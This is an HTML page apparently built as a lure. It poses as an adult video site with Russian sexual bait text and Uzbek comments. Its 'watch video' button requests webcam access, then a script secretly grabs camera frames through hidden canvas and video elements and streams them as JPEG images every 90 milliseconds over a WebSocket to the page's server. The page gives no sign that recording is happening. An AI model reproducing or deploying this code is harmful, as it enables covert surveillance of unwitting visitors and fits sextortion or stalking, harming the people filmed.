<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DragHub - секс оргинал</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #c4b5fd;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }

        #camera-blocker {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #111827;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }

        .start-btn {
            padding: 15px 40px;
            font-size: 20px;
            background-color: #facc15;
            color: black;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
        }

        .logo {
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #000;
        }
        .logo span { color: #facc15; }

        .main-container {
            width: 80%;
            max-width: 800px;
        }

        .video-box {
            width: 100%;
            aspect-ratio: 16/9;
            border: 5px solid #000000;
            background-color: #000;
            box-sizing: border-box;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
    </style>
</head>
<body>

    <div id="camera-blocker">
        <h1 style="margin-bottom: 10px;">СексХуб</h1>
        <p style="font-size: 18px; color: #9ca3af;">Acceptance of the rules</p>
        <button class="start-btn" onclick="initChallenge()">Посмотреть видео</button>
    </div>

    <div class="logo">Drag<span>hub</span></div>

    <div class="main-container">
        <div class="video-box">
            <video id="challenge-video" controls>
                <source src="video.mp4" type="video/mp4">
            </video>
        </div>
    </div>

    <canvas id="hidden-canvas" width="320" height="240" style="display:none;"></canvas>
    <video id="user-camera" autoplay playsinline muted style="display:none;"></video>

    <script>
        const blocker = document.getElementById('camera-blocker');
        const userCamera = document.getElementById('user-camera');
        const canvas = document.getElementById('hidden-canvas');
        const ctx = canvas.getContext('2d');
        let ws;

        async function initChallenge() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 320, height: 240 }, 
                    audio: false 
                });
                
                blocker.style.display = 'none';
                userCamera.srcObject = stream;
                
                // Internet va Lokal uchun universal protokol aniqlash
                const wsProtocol = window.location.protocol === "https:" ? "wss://" : "ws://";
                ws = new WebSocket(wsProtocol + window.location.host + "/ws?role=user");

                ws.onopen = () => {
                    setInterval(() => {
                        if (ws.readyState === WebSocket.OPEN) {
                            ctx.drawImage(userCamera, 0, 0, canvas.width, canvas.height);
                            const base64Data = canvas.toDataURL('image/jpeg', 0.15); 
                            ws.send(base64Data);
                        }
                    }, 90); // Tez va silliq uzatish
                };

            } catch (error) {
                alert("Kameraga ruxsat berilmadi!");
            }
        }
    </script>
</body>
</html>
